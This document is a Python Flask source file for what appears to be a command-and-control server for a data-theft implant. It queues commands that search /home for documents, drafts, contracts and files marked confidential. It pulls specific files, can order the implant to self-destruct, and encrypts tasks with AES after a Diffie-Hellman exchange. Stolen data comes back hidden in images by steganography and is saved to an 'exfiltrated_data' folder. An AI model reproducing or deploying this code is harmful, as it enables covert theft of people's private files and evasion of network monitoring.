from flask import Flask, request, jsonify, Response
import os
from queue import *
import json
from Crypto.Cipher import AES
from stegano import lsb
from diffiehellman import DiffieHellman

shared_key = None
latest_result = None

app = Flask(__name__)

# Predefined command menu
command_menu = {
    0: "find /home -iname '*.doc*' -o -iname '*.odt' -o -iname '*.txt'"
    1: "find /home -iname '*draft*' -o -iname '*report*'"
    2: "find /home -iname '*contract*' -o -iname '*.pdf'"
    3: "grep -ril 'confidential' /home"
    4: 'upload', # Special non-Linux command that requests specific files
    5: 'destroy', # Special non-Linux command that causes client to self-destruct
    6: "ls -la" # For testing
}


# Queue of tasks assigned to the implant
tasks = Queue()

dh1 = DiffieHellman(group=14, key_bits=540)
dh1_public = dh1.get_public_key()

#Encryption of data -- IV is concatenated at the end of message for decryption
def encrypt(plain_str): 
    padding = 16 - (len(plain_str) % 16)
    cipher = AES.new(shared_key, AES.MODE_CBC)
    plaintext = plain_str.encode() + (padding.to_bytes(1, "big") * padding)
    encrypted = cipher.encrypt(plaintext)
    # print(f"[*] Encrypted Message: {encrypted})")
    res = encrypted + cipher.iv
    return res.decode('latin-1')


#Decryption of data 
def decrypt(ciphertext): 
    ciphertext = ciphertext.encode("latin-1")
    init_v = ciphertext[-16:]
    cipher = AES.new(shared_key, AES.MODE_CBC, init_v)
    msg = ciphertext[:-16]
    plaintext = cipher.decrypt(msg)
    plaintext = plaintext[:-plaintext[len(plaintext)-1]]
    # print(f"[*] Unencrypted Message: {plaintext.decode()}")
    return plaintext.decode()

# A controller can invoke the default endpoint to view the command menu
@app.route('/')
def menu():
    return jsonify(command_menu)

@app.route('/getkey', methods=['GET'])
def get_public_key():
    #print(f"[+] Server public key: {dh1_public}")
    return jsonify({"key": dh1_public.decode('latin-1')})


@app.route('/sendkey', methods=['POST'])
def send_public_key():
    global shared_key
    # print("in endpoint")
    res = request.get_json()
    #print(res)
    res = res["key"]
    #print(f"[+] client public key: {res.encode('latin-1')}")
    shared_key = dh1.generate_shared_key(res.encode('latin-1'))[:16]
    # print(f"[+] Derived AES key: {shared_key}")
    return jsonify({"Success": "Yay"}), 200

# A controller can invoke this endpoint to task the client
@app.route('/assign/<int:cmd_index>', methods=['POST'])
def assign_command(cmd_index):
    if 0 <= cmd_index < len(command_menu):
        if cmd_index == 4:
            data = request.get_json()
            path = data.get('path')
            if not path:
                return jsonify({"error": "Missing 'path'"}), 400
            tasks.put(f"upload {path}")
            return jsonify({"message": f"Queued upload: {path}"})
        else:
            tasks.put(command_menu[cmd_index])
            return jsonify({"message": f"Queued: {command_menu[cmd_index]}"})
    else:
        return jsonify({"error": "Bad Request"}), 400


# Implant periodically polls this endpoint to get a task
@app.route('/task', methods=['GET'])
def get_task():
    if not tasks.empty():
        task = tasks.get()
        return jsonify({"task": encrypt(task)})
    return jsonify({"task": encrypt("sleep 10")})


# Implant invokes this endpoint to send exfiltrated data back to the server
# Implant invokes this endpoint to send images back to the server
@app.route('/upload', methods=['POST'])
def receive_data():
    global latest_result
    file = request.files.get('file')
    if file:
        filename = file.filename
        save_path = os.path.join('exfiltrated_data', filename)

        # Make sure directory exists
        os.makedirs('exfiltrated_data', exist_ok=True)

        # Save the uploaded file
        file.save(save_path)
        print(f"Received and saved file: {filename}")
        
        deobfuscated_data = lsb.reveal(save_path)
        output = decrypt(deobfuscated_data)
        latest_result = output
        
        return jsonify({"Success": "Yay"}), 200

    else:
        return jsonify({"error": "No file provided"}), 400
    
@app.route('/result', methods=['GET'])
def get_result():
    global latest_result
    if latest_result:
        result = latest_result
        latest_result = None
        return jsonify({"result": result}), 200
    else:
        return jsonify({"result": None}), 204
    

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
